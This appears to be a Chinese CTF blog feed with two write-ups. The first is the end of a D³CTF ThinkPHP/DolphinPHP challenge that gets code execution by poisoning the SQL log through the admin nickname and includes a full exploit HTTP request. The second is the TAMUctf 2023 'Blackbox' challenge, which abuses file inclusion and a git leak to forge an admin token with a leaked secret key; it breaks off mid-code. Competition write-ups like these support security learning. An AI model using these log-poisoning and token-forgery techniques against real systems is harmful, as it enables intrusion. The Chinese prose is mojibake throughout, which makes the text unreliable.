åœ¨è¿™ä¸ªæŒ‘æˆ˜ä¸­ï¼Œshell_exec è¢«æ·»åŠ åˆ° system.php ä¸­çš„ disable_functionsï¼Œä»¥åŠ php.ini ä¸‹â¾¯çš„å…¶ä»–å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini</span><br><span class="line">_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_waitp</span><br><span class="line">id,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_w</span><br><span class="line">exitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal_dispatch,pcntl_get_last_er</span><br><span class="line">ror,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_</span><br><span class="line">getpriority,pcntl_setpriority,imap_open,apache_setenv,putenv</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„â½¬æ ‡æ˜¯åŸºäº CVE-2021-46097 å†æ¬¡ç»•è¿‡å®ƒ</p><p>è¿™é‡Œçš„è¯å°±æ˜¯ä¸ªå°0dayäº†ï¼Œå¾—è‡ªå·±æŒ–åˆ©ç”¨é“¾äº†  <strong>(ç¬¬ä¸€æ¬¡é‡åˆ°å¾—è‡ªå·±æŒ–0dayçš„é¢˜)</strong></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹æ˜µç§°æ¥å®Œå…¨æ§åˆ¶ <strong>$details</strong>ï¼ˆæ­¤å¤„ä¸º get_nickname(UID)ï¼‰ã€‚action_name ä¸º â€œuser_editâ€ã€‚</p><p><img src="../images/image-20230506222438638.png" alt="image-20230506222438638"></p><p>ä¿®æ”¹åç§°</p><p><img src="../images/image-20230506222544278.png" alt="image-20230506222544278"></p><p>Thinkphp æ¡†æ¶åœ¨ Loader.php ä¸­å®šä¹‰äº†â¼€ä¸ªåä¸º include_file çš„å‡½æ•°</p><p><img src="../images/image-20230506222655072.png" alt="image-20230506222655072"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†think__include_fileä½œä¸ºç¬¬â¼€ä¸ªå‚æ•°ä¼ é€’ç»™call_user_funcã€‚</p><p>å¥‡æ€ªçš„æ˜¯ï¼Œthinkphpåœ¨./runtimeä¸‹è®°å½•äº†SQLâ½‡å¿—ï¼Œâ½½æˆ‘ä»¬åˆšæ‰åšçš„æ˜¯ä¿®æ”¹adminçš„æ˜µç§°ã€‚æ˜µç§°å…ˆè¢«æ‹¼æ¥æˆâ¼€æ¡SQLå‘½ä»¤ï¼Œç„¶åè®° å½•åˆ°â½‡å¿—ä¸­ã€‚</p><p><img src="../images/image-20230506225333824.png" alt="image-20230506225333824"></p><p><img src="../images/image-20230506225655306.png" alt="image-20230506225655306"></p><p>2.ç¼–è¾‘adminçš„æ˜µç§°ï¼Œä½¿â½‡å¿—â½‚ä»¶åŒ…å«æˆ‘ä»¬çš„webshellã€‚</p><p>3.æ“¦é™¤ç¼“å­˜ã€‚è¿™â¼€æ­¥æ˜¯å¿…é¡»çš„ï¼Œå¦åˆ™æ˜µç§°ä¸ä¼šæ›´æ–°ã€‚</p><p><img src="../images/image-20230506230530708.png" alt="image-20230506230530708"></p><p>å°†æ˜µç§°ç¼–è¾‘ä¸º../runtime/2023/05/01.logã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘é€è¿™æ ·çš„è¯·æ±‚æ¥æ‰§â¾PHPä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/admin/index/profile.html HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 114</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,</span><br><span class="line">like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Referer: http://localhost/admin.php/admin/index/profile.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6;</span><br><span class="line">PHPSESSID=88h9tlthje0nfe2sod7c8v6e39</span><br><span class="line">Connection: close</span><br><span class="line">__token__=d8c89447445b0095fb569725f91f0505&amp;nickname=../runtime/log/202304/29.log</span><br><span class="line">&amp;email=&amp;password=&amp;mobile=&amp;avatar=0&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>æœ€åæ”¹å‘½ä»¤æ¥æ‹¿flagå°±è¡Œäº†</p><p><strong>éš¾åäº†</strong>   <strong>å±…ç„¶å¾—è‡ªå·±åˆ†ææºç æ¥æ‹¿é“¾å­</strong>ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>è¿™é‡Œçš„è¯javaè¿˜æœ‰å¥½å¤šä¸œè¥¿æ²¡çœ‹  æ‰€ä»¥javaé¢˜å°±å…ˆä¸è¿›è¡Œå¤ç°äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™é‡Œçš„å¤ç°éƒ½æ˜¯å»ç½‘ä¸Šæœç´¢å‰å‡ åå‘çš„wpæ¥å¤ç°çš„&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;amp;mid=2247486967&amp;amp;idx=1&amp;amp;sn=ad55ddd11c6</summary>
      
    
    
    
    
    <category term="AntCTF x DÂ³CTF" scheme="https://ke1nys.github.io/tags/AntCTF-x-D%C2%B3CTF/"/>
    
  </entry>
  
  <entry>
    <title>TAMUctf 2023-web-å¤ç°</title>
    <link href="https://ke1nys.github.io/posts/662b134b.html"/>
    <id>https://ke1nys.github.io/posts/662b134b.html</id>
    <published>2023-05-01T06:06:14.000Z</published>
    <updated>2023-05-03T12:37:29.077Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/tamuctf/tamuctf-2023/tree/master/web">å®˜æ–¹wpåœ°å€</a></p><p><a href="https://velog.io/@sani/TAMU-CTF-writeups">éŸ©å›½è€å¤–çš„wp</a></p><h2 id="Blackbox"><a href="#Blackbox" class="headerlink" title="Blackbox"></a>Blackbox</h2><p><img src="../images/image-20230501140913517.png" alt="image-20230501140913517"></p><p>è¿™é‡Œçš„è¯è®¿é—®ä¼šæŠ¥é”™ï¼Œå°±æ˜¯ä¸ªæ–‡ä»¶åŒ…å«ï¼Œç„¶åå¯ä»¥å°è¯•ç”¨ä¼ªåè®®è¿›è¡Œè¯»å–æ–‡ä»¶å†…å®¹</p><p><img src="../images/image-20230501141309538.png" alt="image-20230501141309538"></p><p>æ‰«ç›®å½•çš„æ—¶å€™å‘å…ˆgitæºç æ³„éœ²  äºæ˜¯ä½¿ç”¨githackå·¥å…·å»çœ‹èƒ½å¦è¯»å–åˆ°ä¸€äº›ä¸œè¥¿</p><p><img src="../images/image-20230501142033211.png" alt="image-20230501142033211"></p><p>è¯»å–åˆ°äº†æ–‡ä»¶ï¼Œç„¶åå¹¶ä¸‹è½½ä¸‹æ¥äº†</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$resource</span> = <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./util.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(INCLUDE_DIR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$resource</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&#x27;home.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>util.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_login</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT key FROM users WHERE username=:uname AND password=:passwd;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:passwd&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">try_auth</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$hash_password</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">db_login</span>(<span class="variable">$username</span>, <span class="variable">$hash_password</span>)-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_guest_token</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>)), <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_admin_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$username</span>, <span class="keyword">string</span> <span class="variable">$user_key</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>, <span class="string">&#x27;user_key&#x27;</span>=&gt;<span class="variable">$user_key</span>, <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>)[<span class="number">0</span>]), <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_key</span> = <span class="variable">$data</span>[<span class="string">&#x27;user_key&#x27;</span>];</span><br><span class="line">    <span class="variable">$admin</span> = <span class="variable">$data</span>[<span class="string">&#x27;admin&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE username=:uname AND key=:ukey;&#x27;</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:ukey&#x27;</span>, <span class="variable">$user_key</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>() != <span class="literal">false</span> &amp;&amp; <span class="variable">$admin</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501142551816.png" alt="image-20230501142551816"></p><p>å› ä¸ºindex.phpé‡Œé¢æœ‰config.phpæ‰€ä»¥å°±ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹</p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">APP_NAME</span> = <span class="string">&#x27;Blackbox&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">INCLUDE_DIR</span> = <span class="string">&#x27;./templates/&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DB_FILE</span> = <span class="string">&#x27;../sqlite/site-data.db&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_guest_token</span>(), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">try_auth</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_admin_token</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="title function_ invoke__">end</span>(<span class="variable">$result</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;main&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">page</span>=<span class="title">login</span>&quot;, <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">username</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">submit</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">include</span>(<span class="title">INCLUDE_DIR</span> . &#x27;<span class="title">footer</span>.<span class="title">php</span>&#x27;); ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>]) || !<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=login&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">  &lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>); <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;footer.php&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢çš„ä»£ç å°±å¯ä»¥å‘ç°åªè¦<code>auth_token</code>èƒ½åˆ¤å®šä¸ºç®¡ç†å‘˜çš„è¯ï¼Œå°±å¯ä»¥è·³è½¬åˆ°?page=admin  </p><p>æ‰€ä»¥æ¥å…ˆå»loginé¡µé¢æ‹¿åˆ°cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Imd1ZXN0IiwidXNlcl9rZXkiOiJlZGEzNTBkYjFiNzk3NjRiIiwiYWRtaW4iOnRydWV9.fab86457458d9707b051bc8bb7619e8c</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œè§£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;user_key&quot;:&quot;eda350db1b79764b&quot;,&quot;admin&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ä¼ªé€ çš„è¯å°±å¾ˆå…³é”®äº†ï¼Œuser_keyçš„è¯è¦æˆåŠŸä¼ªé€ æˆadminçš„user_keyï¼Œæ‰€ä»¥gitæºç æ³„éœ²çš„æ•°æ®åº“å°±æœ‰ç”¨äº†</p><p><img src="../images/image-20230501143637851.png" alt="image-20230501143637851"></p><p>æŸ¥çœ‹è¿™ä¸ªæ•°æ®åº“å°±ä¼šå‘ç°æœ‰ä¸ªadminçš„user_key</p><p>ç„¶åè¿›è¡Œä¿®æ”¹ä½¿ç”¨</p><p>ç„¶åç»“åˆutil.phpé‡Œçš„ä»£ç è¿›è¡Œä½¿ç”¨</p><p>å°±æ˜¯ç”ŸæˆåŠ å¯†å­—ç¬¦ä¸²åé¢çš„ç­¾å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span 